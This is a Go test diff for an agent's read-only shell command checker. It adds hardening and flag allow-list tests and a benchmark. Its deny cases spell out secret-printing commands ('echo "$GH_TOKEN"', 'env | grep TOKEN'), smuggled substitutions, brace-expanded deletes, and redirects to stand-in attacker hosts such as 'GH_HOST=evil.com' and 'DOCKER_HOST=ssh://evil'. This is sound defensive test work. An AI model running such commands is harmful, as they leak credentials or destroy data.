@@ -2,6 +2,7 @@ package agent
 
 import (
 	"path/filepath"
+	"strings"
 	"testing"
 )
 
@@ -173,7 +174,7 @@ func TestReadOnlyShell(t *testing.T) {
 		{"sed -i s/a/b/ file", false},
 		{"tail -f log", false},
 		{"time git status", true},
-		{"FOO=1 git status", true},
+		{"FOO=1 git status", false},
 		{"PATH=/x git status", false},
 		{"bash -c 'ls'", false},
 		{"mytool --help", true},
@@ -247,8 +248,8 @@ func TestReadOnlyReadDenySparesNoFileSegments(t *testing.T) {
 		"grep x " + secret:                             {Deny, Allow},
 		"grep -v '^$' f && grep -c '[0-9]' f":          {Allow, Allow},
 		"grep '^$' '" + secret + "'":                   {Deny, Allow},
-		"cat $'" + root + "/state/vault\\x2edb'":       {Deny, Allow},
-		"grep \"$X\" f":                                {Deny, Allow},
+		"cat $'" + root + "/state/vault\\x2edb'":       {Deny, Deny},
+		"grep \"$X\" f":                                {Deny, Deny},
 		"cat ../x && head -5 memory/../memory/a.md":    {Allow, Allow},
 	}
 	for name, deny := range map[string]Rule{"absolute": {Tool: "Read", Arg: secret}, "glob": {Tool: "Read", Arg: "**/state/vault.db"}} {
@@ -376,7 +377,7 @@ func TestReadOnlyClusterCLIs(t *testing.T) {
 		"kubectl api-resources", "kubectl explain pod", "kubectl config get-contexts", "kubectl config current-context",
 		"kubectl -n ns get pods", "kubectl --namespace ns get pods", "kubectl --namespace=ns get pods", "kubectl --context x get pods -o wide",
 		"oc get pods", "oc -n ns logs x", "oc config current-context", "kubectl get pods | wc -l",
-		"docker ps", "docker images", "docker inspect x", "docker logs x", "docker version", "docker info", "docker --context x ps",
+		"docker ps", "docker images", "docker logs x", "docker version", "docker info", "docker --context x ps",
 		"docker --context=x ps -a",
 		"gh pr view 42", "gh pr list", "gh pr status", "gh pr diff 42", "gh pr checks 42", "gh issue view 1", "gh issue list",
 		"gh issue status", "gh repo view", "gh run view 1", "gh run list", "gh release view v1", "gh release list", "gh auth status",
@@ -394,7 +395,7 @@ func TestReadOnlyClusterCLIs(t *testing.T) {
 		"kubectl get pods --kubeconfig /x", "kubectl get pods --server https://x", "kubectl --kubeconfig /x get pods",
 		"kubectl --server x get pods", "kubectl -n get pods", "kubectl -n --context get pods", "kubectl --as x get pods",
 		"oc delete x", "oc whoami -t", "oc login", "oc config view",
-		"docker run x", "docker rm x", "docker exec x sh", "docker build .", "docker pull x", "docker stop x", "docker logs -f x",
+		"docker inspect x", "docker run x", "docker rm x", "docker exec x sh", "docker build .", "docker pull x", "docker stop x", "docker logs -f x",
 		"docker -H tcp://x ps", "docker --host x ps", "docker context use x", "docker --context ps",
 		"gh api /user", "gh auth token", "gh auth login", "gh auth status --show-token", "gh auth status -t", "gh pr create",
 		"gh pr merge 1", "gh pr checkout 1", "gh pr view 1 --web", "gh pr checks 1 --watch", "gh issue create", "gh repo clone x",
@@ -409,4 +410,85 @@ func TestReadOnlyClusterCLIs(t *testing.T) {
 		rows = append(rows, roCase{c, false})
 	}
 	checkReadOnly(t, rows)
+}
+
+// Expansion, assignments, printf -v and an env printer anywhere are refused; the ordinary reads beside them pass.
+func TestReadOnlyHardening(t *testing.T) {
+	var rows []roCase
+	for _, c := range []string{
+		`echo "$GH_TOKEN"`, "printf %s $ANTHROPIC_API_KEY", "echo ${HOME}", `echo $'\x41'`, "echo $((1+2))", `echo "a$b"`,
+		"printf -v 'a[$(id)]' x", "printf -v x y", "printf -vx y",
+		"find . -{exec,x} rm {} +", "find . -d{elete,}", "kubectl get sec{ret,}", "kubectl get {secret,pods}", "cat f{1..3}",
+		"x=secret; kubectl get $x", "kubectl get ${x:-secret}", "git log --{output,}=/tmp/x", "git grep -{O,} sh x",
+		"gh auth status -{t,}", "x='$(id)'; echo ${x@P}",
+		"PATH=/tmp/x; git log", "HOME=/tmp/x; git log", "XDG_CONFIG_HOME=/tmp/x && gh pr list", "BASH_ENV=/tmp/x; ls",
+		"FOO=1 git status", "printf -v PATH /tmp/x; ls", "KUBERNETES_MASTER=http://evil kubectl get pods",
+		"KUBECONFIG=/tmp/x kubectl get pods", "DOCKER_HOST=ssh://evil docker ps", "AWS_CONFIG_FILE=/tmp/x aws sts get-caller-identity",
+		"CLOUDSDK_PYTHON=/tmp/x gcloud version", "GH_HOST=evil.com gh pr list",
+		"env | grep TOKEN", "env | wc -l", "env -0 | grep x", "/usr/bin/env | grep x", "env; grep x y", "env && ls",
+		"command env | grep x", "nohup env | grep x", "time env | grep x", "ls | env", "printenv | grep x", "set | grep x",
+		"export -p | grep x", "declare -p | grep x", "compgen -v | grep x", "compgen -e",
+		"claude-code agents sync", "claude-code agents sync --agent codex", "claude-code agents sync --check --force",
+	} {
+		rows = append(rows, roCase{c, false})
+	}
+	for _, c := range []string{
+		"grep 'a{2}' f", "grep -E 'x{1,3}' f", `rg '\$HOME' x`, "grep 'a$' f", `grep "a$" f`, `git log --format="%h %s"`,
+		"echo '$HOME'", "echo done", "LC_ALL=C git status", "TZ=UTC git log -1", "git stash show -p stash@{1}",
+		"git branch -av", "git branch -rv", "git grep -n foo", "git grep -il foo", "git remote -v",
+		"claude-code agents sync --check", "claude-code agents sync --dry-run --agent codex",
+	} {
+		rows = append(rows, roCase{c, true})
+	}
+	checkReadOnly(t, rows)
+}
+
+// Short-flag clusters are read letter by letter, and each CLI subcommand takes only the flags on its list.
+func TestReadOnlyCLIFlagAllowList(t *testing.T) {
+	var rows []roCase
+	for _, c := range []string{
+		"gh auth status -at", "gh auth status -atq", "kubectl get pods -Aw", "kubectl get pods -lw x", "kubectl logs x -pf",
+		"docker logs x -tf", "gh pr view -cw", "gh issue view 1 -cw", "gh pr list -aw", "gh run view 1 -vw",
+		"git grep -iOsh x", "git grep -nO sh x",
+		"docker inspect x", "docker inspect -f '{{.Config.Env}}' x", "oc get oauthclients", "oc get oauthclient x -o yaml",
+		"oc get oauthaccesstokens", "oc get oauthauthorizetokens", "oc get useroauthaccesstokens", "kubectl get pods -o yaml",
+		"kubectl get pods -o json", "kubectl get pods -o=go-template=x", "kubectl get pods -ojson", "kubectl get cm -o yaml",
+		"kubectl get pods -o custom-columns=E:.spec", "kubectl get pods --profile=cpu --profile-output=/tmp/x",
+		"kubectl get pods --cache-dir=/x", "kubectl get pods --proxy-url=http://evil", "kubectl get pods --insecure-skip-tls-verify",
+		"kubectl get pods --user=x", "kubectl get pods --filename=x", "kubectl get pods -A=true", "kubectl get pods --all-namespaces=1",
+		"aws sts get-caller-identity --debug", "aws sts get-caller-identity --endpoint-url http://evil", "aws --debug sts get-caller-identity",
+		"gcloud config list --access-token-file=/x", "gcloud config list --log-http", "gh pr list --jq .[]", "gh pr view 1 -t x",
+		"oc whoami -t", "oc whoami --show-token", "oc whoami -ct", "docker logs x --details", "docker ps --format x",
+		"kubectl logs x --follow=true", "kubectl get pods --", "gh pr list -R evil.com/a/b",
+	} {
+		rows = append(rows, roCase{c, false})
+	}
+	for _, c := range []string{
+		"kubectl get pods -A -o wide", "kubectl get pods -l app=x -n ns", "kubectl get pods --selector=app=x -o name",
+		"kubectl logs x --tail 50 --since 1h -c app", "kubectl logs x --tail=50 -p", "kubectl describe pod x -n ns",
+		"kubectl top pods -A", "docker logs x --tail 100 -t", "docker ps -aq", "docker images -q", "docker network ls",
+		"docker volume ls -q", "gh pr view 42 --json title,body", "gh pr list -L 5 -s open", "gh auth status -a",
+		"gh run list -L 5", "gh pr view 42 -c", "gh pr list -R a/b", "oc whoami", "oc whoami --show-server",
+		"kubectl get serviceaccounts",
+	} {
+		rows = append(rows, roCase{c, true})
+	}
+	checkReadOnly(t, rows)
+}
+
+// The read-only check runs on every Bash call of a --read-only agent.
+func BenchmarkReadOnlyShell(b *testing.B) {
+	var script []string
+	for i := range 40 {
+		script = append(script, []string{"git status", "rg foo internal", "cat a.go | head -5", "git log --oneline -3"}[i%4])
+	}
+	for name, cmd := range map[string]string{"status": "git status",
+		"pipe6":    "git log --oneline -20 | grep x | head -5 | cat | wc -l | tail -1",
+		"script40": strings.Join(script, "\n")} {
+		b.Run(name, func(b *testing.B) {
+			for b.Loop() {
+				ReadOnlyShell(cmd)
+			}
+		})
+	}
 }
